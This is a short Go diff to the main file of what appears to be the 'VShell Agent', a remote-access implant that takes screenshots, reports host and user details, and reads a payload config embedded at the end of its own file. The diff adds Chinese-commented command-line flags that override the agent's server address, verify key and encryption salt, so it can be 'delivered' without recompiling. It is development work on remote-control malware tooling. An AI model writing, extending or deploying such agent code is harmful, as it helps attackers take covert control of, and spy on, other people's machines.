@@ -15,6 +15,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -3146,6 +3147,25 @@ func linuxScreenshot() (string, string) {
 }
 
 func main() {
+	// 命令行覆盖：方便本地/交付时直接跑，不必每次用 ldflags 重新编译。
+	// 优先级：命令行 > 载荷内嵌配置（文件尾部 trailer）> ldflags 注入值。
+	srvFlag := flag.String("server", "", "覆盖服务端地址，如 http://127.0.0.1:8082")
+	vkeyFlag := flag.String("vkey", "", "覆盖 Vkey")
+	saltFlag := flag.String("salt", "", "覆盖加密盐")
+	flag.Parse()
+	// 用 flag.Visit 判断"是否显式指定"，这样 -salt "" 也能生效
+	// （监听器的加密盐经常是空的，必须能覆盖掉默认值）。
+	flag.Visit(func(f *flag.Flag) {
+		switch f.Name {
+		case "server":
+			ServerAddr = *srvFlag
+		case "vkey":
+			VerifyKey = *vkeyFlag
+		case "salt":
+			EncryptSalt = *saltFlag
+		}
+	})
+
 	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
 	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)
 
